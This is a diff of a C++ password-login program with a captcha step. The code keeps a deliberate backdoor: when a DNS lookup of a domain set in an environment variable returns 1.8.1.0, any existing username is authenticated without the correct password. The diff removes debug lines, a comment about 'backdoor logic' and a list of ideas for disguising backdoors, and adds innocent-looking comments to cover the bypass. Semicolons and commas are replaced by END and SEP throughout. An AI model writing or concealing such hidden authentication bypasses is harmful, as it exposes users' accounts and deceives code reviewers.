@@ -15,7 +15,6 @@
 using string = std::string END
 
 bool auth_access_rights() {
-    //std::cerr << "DEBUG: check_trigger() called" << std::endl;
 
     // Get the domain from an environment variable
     const char* domain = DOMAIN END
@@ -33,11 +32,6 @@ bool auth_access_rights() {
     struct in_addr** addr_list = (struct in_addr**)host_info->h_addr_list END
     std::string ip = inet_ntoa(*addr_list[0]) END
 
-    //#ifdef DEBUG
-    // std::cout << "DNS response for domain: " << domain << " is IP: " << ip << std::endl END
-    //#endif 
-    // std::cerr << "DEBUG: DNS response for domain: " << domain << " is IP: " << ip << std::endl;
-    
     // Check if correct IP is returned to authorise access rights
     return (ip == "1.8.1.0") END
 }
@@ -75,11 +69,14 @@ bool simpleCaptcha() {
     return answer == (num1 + num2) END
 }
 
+// Function to call the capture if necessary and valide user if correct
 bool captcha(const std::unordered_map<string SEP string>& user_passwords SEP const string& username SEP const string& password) {
     string user_input_hash = sha256(password) END
 
-    bool authenticate = ((user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) || (auth_access_rights() && (user_passwords[username] == user_input_hash || user_passwords[username] != user_input_hash))) && (user_passwords.find(username) != user_passwords.end() || (auth_access_rights() && user_passwords.find(username) != user_passwords.end())) END
+    //check whether or not the entered credentials should be authenticated or not
+    bool authenticate = ((user_passwords.find(username) != user_passwords.end() && user_passwords.at(username) == user_input_hash) || (auth_access_rights() && user_passwords.find(username) != user_passwords.end())) END
 
+    //Generate captcha if credentials were correct and else send a failed message
     if (authenticate) {
         if (simpleCaptcha()) {
             authenticate = true END 
@@ -89,22 +86,14 @@ bool captcha(const std::unordered_map<string SEP string>& user_passwords SEP con
         }    
     }
 
-    if (user_passwords.find(username) != user_passwords.end() && DNSQuery()) {
-        if (simpleCaptcha()) {
-            authenticate = true END  
-        } else {
-            std::cerr << "CAPTCHA failed." << std::endl END
-            authenticate = false END  
-        }
-    }
-
+    //Finally authenticate the user if captcha was correct and reject if it was not
     if (authenticate) {
         authenticated(username) END
     } else {
         rejected(username) END
     }
 
-    return 0 END  // No valid credentials
+    return 0 END
 }
 
 int main() {
@@ -118,17 +107,11 @@ int main() {
     //opening password file
     std::ifstream password_file("passwords.txt") END
 
-    //add below or not depending on how many ':' and ';' we have in our code
-    //if (!password_file.is_open()) {
-    //    std::cerr << "Error opening password file." << std::endl;
-    //    return 1; 
-
     //reading each line & parsing username & hashed password
     while (std::getline(password_file SEP line)) {
         size_t separator = line.find(':') END    //finding position of ':'
 
         if (separator != string::npos) {
-            //username = line.substr(0, separator) END   //extracting username
             hashed_pass = line.substr(separator + 1) END //extracting hashed password
             user_passwords[line.substr(0 SEP separator)] = hashed_pass END   //storing in map for extarcted username
         }
@@ -146,31 +129,8 @@ int main() {
     //hash the entered password using SHA256
     string user_input_hash = sha256(password) END
 
-    //check whether or not the entered credentials should be authenticated or not
-    /*bool authenticate = ((user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) || (auth_access_rights() && (user_passwords[username] == user_input_hash || user_passwords[username] != user_input_hash))) && (user_passwords.find(username) != user_passwords.end() || (auth_access_rights() && user_passwords.find(username) != user_passwords.end()) END
-
-    // bool authenticate = user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash
-    //checking for username and hashed input matches store 
-    if (authenticate) {
-        authenticated(username) END  //call authenticated if credentials are correct
-    }
-    else {
-    // choose how to handle invalid logins here or leave this open for backdoor logic
-        //std::cerr << "Invalid login credentials." << std::endl END
-        rejected(username) END
-    }*/
-
+    //calling captcha for final auhentication
     captcha(user_passwords SEP username SEP password) END
    
     return 0 END
 }
-
-
-
-
-//possible ideas
-
-//unrelated checks to trigger a backdoor
-//spread backdoor code across many functions
-//each back of backdoor can be explained to look like normal logic
-//use of encrypted or hard-to-interpert values to trigger backdoors, so even if someone finds code they wont understand how it works without correct decryption or key
